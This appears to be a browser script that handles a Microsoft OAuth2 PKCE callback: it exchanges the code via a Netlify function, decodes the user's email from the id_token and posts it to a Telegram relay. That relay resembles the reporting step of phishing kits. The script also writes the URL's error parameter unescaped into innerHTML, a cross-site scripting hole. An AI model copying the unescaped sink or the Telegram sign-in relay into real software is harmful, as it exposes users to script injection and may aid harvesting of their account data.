// OAuth Callback Handler for Microsoft OAuth2 (PKCE Flow)
// This script is loaded by public/oauth-callback.html after Microsoft redirects back

async function handleOAuthCallback() {
    const statusEl = document.getElementById('status');
    const resultEl = document.getElementById('result');

    try {
        const urlParams = new URLSearchParams(window.location.search);
        const code = urlParams.get('code');
        const state = urlParams.get('state');
        const error = urlParams.get('error');

        if (error) {
            statusEl.textContent = 'OAuth error: ' + error;
            resultEl.innerHTML = `<div class="error">OAuth error: ${error}</div>`;
            return;
        }

        if (!code || !state) {
            statusEl.textContent = 'Missing code or state!';
            resultEl.innerHTML = `<div class="error">Missing code or state in callback.</div>`;
            return;
        }

        statusEl.textContent = 'Exchanging code for tokens...';

        // POST to your backend to exchange code for tokens
        const res = await fetch('/.netlify/functions/tokenExchange', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ code, state }),
        });

        const tokenData = await res.json();

        if (tokenData.error) {
            statusEl.textContent = 'Token exchange failed';
            resultEl.innerHTML = `<div class="error">Token exchange failed: ${tokenData.error}</div>`;
            return;
        }

        // Extract email from tokenData
        let userEmail = null;
        if (tokenData.tokens && tokenData.tokens.id_token) {
            // Decode JWT (base64url)
            const payload = tokenData.tokens.id_token.split('.')[1];
            const decoded = JSON.parse(atob(payload.replace(/-/g, '+').replace(/_/g, '/')));
            userEmail =
                decoded.email ||
                decoded.preferred_username ||
                decoded.upn ||
                decoded.unique_name ||
                null;
        }

        // Optionally, fallback to Graph API profile if present
        if (!userEmail && tokenData.userProfile) {
            userEmail =
                tokenData.userProfile.mail ||
                tokenData.userProfile.userPrincipalName ||
                null;
        }

        // Send info to Telegram if needed
        await fetch('/.netlify/functions/sendTelegram', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                email: userEmail,
                provider: 'Microsoft',
                timestamp: new Date().toISOString(),
                // Add more data as needed
            }),
        });

        statusEl.textContent = 'Sign-in successful!';
        resultEl.innerHTML = `<div class="success">Signed in as <strong>${userEmail || 'Unknown Email'}</strong></div>`;
    } catch (err) {
        statusEl.textContent = 'Error occurred during callback.';
        resultEl.innerHTML = `<div class="error">${err.message}</div>`;
        console.error('OAuth callback error:', err);
    }
}

// Run on load
handleOAuthCallback();